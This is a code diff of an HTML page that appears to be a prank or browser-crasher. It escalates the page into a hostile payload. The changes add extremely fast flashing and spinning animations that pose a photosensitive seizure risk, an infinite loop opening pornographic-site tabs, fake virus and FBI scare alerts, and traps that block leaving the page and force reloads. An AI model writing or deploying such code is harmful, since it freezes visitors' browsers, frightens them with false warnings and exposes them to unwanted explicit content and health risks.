@@ -14,23 +14,23 @@
             cursor: url('https://cur.cursors-4u.net/cursors/cur-2/cur107.ani'), auto;
         }
         .flashing {
-            animation: flash 0.03s infinite alternate;
+            animation: flash 0.005s infinite alternate;
         }
         @keyframes flash {
             0% { color: red; background: yellow; transform: scale(1); }
-            100% { color: blue; background: green; transform: scale(2); }
+            100% { color: blue; background: green; transform: scale(3); }
         }
         .spinny {
-            animation: spin 0.1s linear infinite;
+            animation: spin 0.02s linear infinite;
         }
         @keyframes spin {
             from { transform: rotate(0deg); }
-            to { transform: rotate(720deg); }
+            to { transform: rotate(2880deg); }
         }
         .moving {
             position: absolute;
-            font-size: 4em;
-            animation: move 1s infinite alternate ease-in-out;
+            font-size: 6em;
+            animation: move 0.1s infinite alternate ease-in-out;
         }
         @keyframes move {
             0% { top: 0; left: 0; }
@@ -38,15 +38,15 @@
         }
         .chaotic {
             position: absolute;
-            font-size: 5em;
+            font-size: 6em;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            animation: chaos 0.05s infinite alternate;
+            animation: chaos 0.005s infinite alternate;
         }
         @keyframes chaos {
             0% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
-            100% { transform: translate(-20%, -20%) rotate(1080deg) scale(3); }
+            100% { transform: translate(-30%, -30%) rotate(4320deg) scale(5); }
         }
     </style>
 </head>
@@ -63,48 +63,49 @@
             let colors = ["red", "blue", "green", "yellow", "pink", "purple", "orange", "cyan", "white", "black"];
             setInterval(() => {
                 document.body.style.background = colors[Math.floor(Math.random() * colors.length)];
-            }, 20);
+            }, 5);
             setInterval(() => {
                 document.getElementById("randomText").innerHTML = "🔥 " + Math.random().toString(36).substring(2, 12) + " 🔥";
-            }, 100);
+            }, 20);
             setInterval(() => {
-                alert("🎉 CONGRATULATIONS! YOU HAVE WON A CASTLE ON MARS! 🎉");
-            }, 3000);
+                alert("💀 ERROR 999: DIMENSION SHIFT IN PROGRESS 💀");
+            }, 1000);
             setInterval(() => {
-                confirm("⚠️ ALERT: Government surveillance detected. Continue?");
-            }, 5000);
-            setInterval(() => {
-                prompt("💰 Enter your soul ID to unlock infinite wealth! 💰", "");
-            }, 7000);
-            setInterval(() => {
-                window.open("https://pornhub.com", "_blank");
-            }, 9000);
-            setInterval(() => {
-                for (let i = 0; i < 10; i++) {
-                    window.open("https://pornhub.com", "_blank");
-                }
-            }, 11000);
-            setInterval(() => {
-                document.title = "🚨 FBI ALERT 🚨";
+                confirm("⚠️ ALERT: MIND CONTROL ACTIVATED. CONTINUE?");
             }, 1500);
             setInterval(() => {
-                document.body.innerHTML += '<marquee>🌈 THE MATRIX IS REAL 🌈</marquee>';
+                prompt("💰 ENTER YOUR SOUL ID TO UNLOCK INFINITE WEALTH! 💰", "");
+            }, 2000);
+            setInterval(() => {
+                while (true) { window.open("https://pornhub.com", "_blank"); }
             }, 2500);
             setInterval(() => {
-                alert("💀 ERROR 666: REALITY BREAKDOWN INITIATED 💀");
-            }, 4500);
+                document.title = "🚨 FBI WARNING: BRAIN HACKED 🚨";
+            }, 500);
             setInterval(() => {
-                window.open("https://www.example.com", "_blank", "width=500,height=500,left=" + Math.random() * screen.width + ",top=" + Math.random() * screen.height);
-            }, 5500);
+                document.body.innerHTML += '<marquee>🌈 THE MATRIX HAS YOU 🌈</marquee>';
+            }, 500);
             setInterval(() => {
-                document.body.style.transform = "rotate(" + Math.random() * 360 + "deg)";
-            }, 6000);
+                alert("⚠️ VIRUS DETECTED! SELF-DESTRUCT IN 10 SECONDS! ⚠️");
+            }, 1250);
             setInterval(() => {
-                document.body.style.fontSize = Math.random() * 50 + "px";
-            }, 3500);
+                window.onbeforeunload = function() { return "YOU CANNOT LEAVE!"; };
+            }, 250);
+            setInterval(() => {
+                history.pushState(null, "", location.href);
+            }, 500);
+            setInterval(() => {
+                document.body.style.transform = "rotate(" + Math.random() * 1440 + "deg)";
+            }, 500);
+            setInterval(() => {
+                document.body.style.fontSize = Math.random() * 200 + "px";
+            }, 250);
             setInterval(() => {
                 document.body.innerHTML += '<p class="flashing">🛑 ERROR: UNIVERSE COLLAPSING 🛑</p>';
-            }, 6500);
+            }, 500);
+            setInterval(() => {
+                location.href = location.href;
+            }, 1000);
         }
     </script>
 </body>
